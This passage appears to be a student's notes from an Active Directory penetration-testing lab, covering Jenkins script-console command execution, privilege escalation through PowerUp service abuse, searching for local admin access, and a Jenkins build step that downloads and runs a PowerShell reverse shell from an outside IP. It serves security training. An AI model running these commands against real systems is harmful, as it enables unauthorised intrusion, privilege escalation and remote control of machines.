common in environments but BloodHound often won't show you
- targeting enterprise applications that run as Administrator or System

# Jenkins
- if you have admin access (default before 2.x) go to http//\<server\>/script
```
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKil
```
- if you don't have admin access, but could add or edit build steps, do the following:
	- Add a build step -> add "Execute Windows Batch Command" -> Enter "`powershell -c <command>`"
- can also try hydra's `-nsr` flag to try null password, login as pass, and reversed login


## Learning Objective

### Exploit a service on dcorp-student and elevate privileges to local administrator
![[assets/Pasted image 20260131025527.png|Pasted image 20260131025527.png]]
`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`

`C:\AD\Tools\PowerUp.ps1`

`Invoke-AllChecks`
![[assets/Pasted image 20260131025716.png|Pasted image 20260131025716.png]]
- vulnerable to unquoted service paths

![[assets/Pasted image 20260131025804.png|Pasted image 20260131025804.png]]
- modifiable service that we can restart
	- this one is easier
	- running `help Invoke-ServiceAbuse` shows potential ways to use the script
	- the AbuseFunction given by the AllChecks output (check image above) will create a new user and give them administrator access
- we ideally want an already created domain user and will just give them administrator

`Invoke-ServiceAbuse -Name '<service_name>' -UserName <DOMAIN>\<user> -Verbose`
![[assets/Pasted image 20260131030328.png|Pasted image 20260131030328.png]]


### Identify a machine in the domain where student has local administrator access
![[assets/Pasted image 20260131025527.png|Pasted image 20260131025527.png]]
`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`

`C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`
`Find-PSRemotingLocalAdminAccess -Verbose`
- going to be very noisy 
![[assets/Pasted image 20260131030756.png|Pasted image 20260131030756.png]]



### Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 (dcorp.ci server)
login -> go to projects -> choose a project -> see if you can modify
- if you are able to modify, you can add build step -> execute Windows batch command -> `powershell iex (iwr -UseBasicParsing`  http://IP/Invoke-PowerShellTCP.ps1);power -Reverse -IPAddress IP -Port \<port\>
	- creates a reverse shell and connects back to iP and port specified
	- once done, go back and run the project
![[assets/Pasted image 20260131031834.png|Pasted image 20260131031834.png]]
